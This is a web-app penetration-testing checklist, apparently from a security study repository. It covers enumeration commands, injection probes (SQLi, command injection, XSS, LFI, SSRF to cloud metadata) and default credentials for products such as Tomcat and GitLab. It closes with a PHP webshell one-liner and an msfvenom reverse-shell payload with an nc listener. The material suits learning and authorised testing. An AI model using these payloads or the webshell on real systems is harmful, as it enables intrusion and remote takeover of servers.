# 02 — Web

**Jump to:** [First 10 minutes on any web app](#first-10-minutes-on-any-web-app) · [Enumeration](#enumeration) · [Attack surface triage (per input field)](#attack-surface-triage-per-input-field) · [Login pages](#login-pages) · [Once you have any authenticated access](#once-you-have-any-authenticated-access) · [CMS / product-specific](#cms--product-specific) · [When it works — get a shell](#when-it-works--get-a-shell)

Trigger: any HTTP(S) port open.
Reference: [Web Recon](../1-information-gathering/05-web-recon.md) · [Web Proxies](../2-pre-exploitation/02-web-proxies.md) · [Web Exploits](../3-exploitation/04-web-exploits.md).

## First 10 minutes on any web app

- [ ] Load the site in a browser with Burp on.
- [ ] `whatweb <url>` — CMS, framework, versions.
- [ ] View source (`Ctrl-U`) — hidden comments, JS files, config leaks.
- [ ] `curl -I <url>` — check headers (`Server`, `X-Powered-By`, `Set-Cookie`).
- [ ] Robots + sitemap: `curl <url>/robots.txt`, `curl <url>/sitemap.xml`.
- [ ] `.git` exposed? `curl <url>/.git/HEAD` — if 200, `git-dumper <url>/.git/ ./gitdump`.

## Enumeration

- [ ] **Directories**: `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u <url>/FUZZ -mc 200,204,301,302,307,401,403`.
- [ ] **Files** by extension: `ffuf -w wordlist.txt -u <url>/FUZZ -e .php,.txt,.bak,.zip,.old`.
- [ ] **Vhosts**: `ffuf -w subdomains.txt -H "Host: FUZZ.<domain>" -u <url> -fs <baseline-size>`.
- [ ] **Subdomains**: `ffuf -w subdomains.txt -u https://FUZZ.<domain> -fs 0`.
- [ ] **Parameters**: `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u <url>/page.php?FUZZ=1 -fs <baseline>`.

## Attack surface triage (per input field)

For every input that reaches the backend, tick the ones that make sense:

- [ ] **SQL injection** — `'`, `"`, `)`, `;--`, and `sleep(5)`. If time delay hits, sqlmap it. See [SQL Injection](../3-exploitation/04-web-exploits.md#sql-injection).
- [ ] **Command injection** — `;id`, `|id`, `&&id`, `` `id` ``, `$(id)`. URL-encode. See [Command Injection](../3-exploitation/04-web-exploits.md#command-injection-os).
- [ ] **XSS** — `<script>alert(1)</script>`, `"><svg onload=alert(1)>`. See [XSS](../3-exploitation/04-web-exploits.md#xss-cross-site-scripting).
- [ ] **LFI** — `../../../../etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`. See [File Inclusion](../3-exploitation/04-web-exploits.md#file-inclusion-lfi--rfi).
- [ ] **File upload** — try `.phtml`, `.phar`, `.pht`, magic-byte-prefix, double-extension. See [File Upload](../3-exploitation/04-web-exploits.md#file-upload--webshell).
- [ ] **XXE** — if the request body is XML, define an entity. See [XXE](../3-exploitation/04-web-exploits.md#xxe-injection-xml-external-entity).
- [ ] **IDOR** — increment/decrement any ID in URL or body. Mass-enum with Burp Intruder. See [IDOR](../3-exploitation/04-web-exploits.md#idor-insecure-direct-object-reference).
- [ ] **HTTP verb tampering** — 403 on `GET`? Try `HEAD`, `PUT`, `PATCH`. See [HTTP Verb Tampering](../3-exploitation/04-web-exploits.md#http-verb-tampering).
- [ ] **SSRF** — any URL fetcher (`?url=`, `?image=`)? Try `http://127.0.0.1`, `http://169.254.169.254/latest/meta-data/`.

## Login pages

- [ ] Try `admin:admin`, `admin:password`, `root:root`, `<product>:<product>`.
- [ ] View source of the login form — hidden fields, error-response differences.
- [ ] User enumeration — different response for valid vs invalid usernames? Note it.
- [ ] Brute-force only after: (a) you have a userlist, (b) no lockout mentioned, (c) you've tried defaults.
  - `medusa -h <ip> -U users.txt -P passwords.txt -M http -m FORM:"/login.php" -m DENY-SIGNAL:"Invalid"`.
- [ ] Password reset flow — token reuse? Predictable tokens? User enum via response?
- [ ] Registration open? Register a low-priv account and see what changes.

## Once you have any authenticated access

- [ ] Re-run every attack in the checklist above (auth expands attack surface).
- [ ] Look for role-check bypass — `?role=admin`, `Cookie: role=admin`, JWT `alg=none`.
- [ ] Session cookie is JWT? `jwt_tool <token>` — check for `none`, weak secret, `kid` injection.
- [ ] Upload / import / export functionality? Retest all upload/LFI/XXE angles.
- [ ] Any "download" / "view file" feature? LFI + path traversal candidate.

## CMS / product-specific

- [ ] **WordPress** → `wpscan --url <url> --enumerate ap,at,u`. `admin` / `wp-admin`.
- [ ] **Joomla** → `joomscan --url <url>`.
- [ ] **Drupal** → check `/CHANGELOG.txt`, `/core/CHANGELOG.txt` for version.
- [ ] **Tomcat** → `/manager/html` with `tomcat:tomcat`, `admin:admin`.
- [ ] **Jenkins** → `/script` if unauth'd = RCE.
- [ ] **Splunk** → `admin:changeme`.
- [ ] **Gitlab** → `root:5iveL!fe` (old default).
- [ ] **phpMyAdmin** → `root:` empty, `root:root`.

## When it works — get a shell

- [ ] Upload webshell (see file-upload notes). PHP one-liner: `<?php system($_REQUEST['c']); ?>`.
- [ ] Bake reverse shell with `msfvenom -p php/reverse_php LHOST=<tun0> LPORT=4444 -f raw > shell.php`.
- [ ] Catch on `nc -lvnp 4444`; upgrade with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
- [ ] Once on the box → [04-linux-privesc.md](./04-linux-privesc.md) or [05-windows-privesc.md](./05-windows-privesc.md).
